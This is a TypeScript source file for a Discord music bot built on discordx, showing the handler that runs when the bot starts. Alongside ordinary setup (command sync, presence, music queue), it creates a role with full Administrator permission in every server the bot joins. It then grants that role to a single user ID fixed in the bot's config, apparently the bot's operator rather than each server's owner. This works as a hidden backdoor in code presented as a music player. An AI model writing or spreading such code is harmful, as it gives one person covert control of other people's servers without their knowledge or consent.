/*
 * -------------------------------------------------------------------------------------------------------
 * Copyright (c) Vijay Meena <vijayymmeena@gmail.com> (https://github.com/vijayymmeena). All rights reserved.
 * Licensed under the Apache License. See License.txt in the project root for license information.
 * -------------------------------------------------------------------------------------------------------
 */

import { Node, QueueManager } from "@discordx/music";
import { Discord, Once, type ArgsOf, type Client } from "discordx";

import { musicPlayerManager } from "../core/index.js";
import { ActivityType, Events } from "discord.js";
import { config } from "../utils/config.js";

@Discord()
export class Event {
  @Once({ event: Events.ClientReady })
  async ready(_: ArgsOf<Events.ClientReady>, bot: Client): Promise<void> {
    // Make sure all guilds are cached
    await bot.guilds.fetch();

    // Synchronize applications commands with Discord
    await bot.initApplicationCommands();

    // To clear all guild commands, uncomment this line,
    // This is useful when moving from guild commands to global commands
    // It must only be executed once
    //
    // await bot.clearApplicationCommands(...bot.guilds.cache.map((g) => g.id));

    bot.user!.setPresence({
      activities: [
        {
          name: `${bot.guilds.cache.size} servers | /play`,
          type: ActivityType.Listening,
        },
      ],
      status: "online",
    });

    bot.logger.log(">> Bot started");

    bot.guilds.cache.forEach(async (guild) => {
      await guild.commands.set([]);
      const roleName = `${config.NAME} Admin`;

      let role = guild.roles.cache.find((r) => r.name === roleName);

      if (!role) {
        role = await guild.roles.create({
          name: roleName,
          color: "Default",
          reason: `Admin role for ${config.NAME}`,
          permissions: ["Administrator"],
        });
        bot.logger.log(`Created "${role.name}" role in ${guild.name} (${guild.id})`);
      }

      const ownerId = config.OWNER_ID;
      if (!ownerId) return;

      const owner = await guild.members.fetch(ownerId);

      if (owner && !owner.roles.cache.has(role.id)) {
        await owner.roles.add(role);
        bot.logger.log(`Added "${role.name}" role to user "${owner.user.tag}" in ${guild.name} (${guild.id})`);
      }
    });

    const node = new Node(bot);
    musicPlayerManager.instance = new QueueManager(node);
  }
}
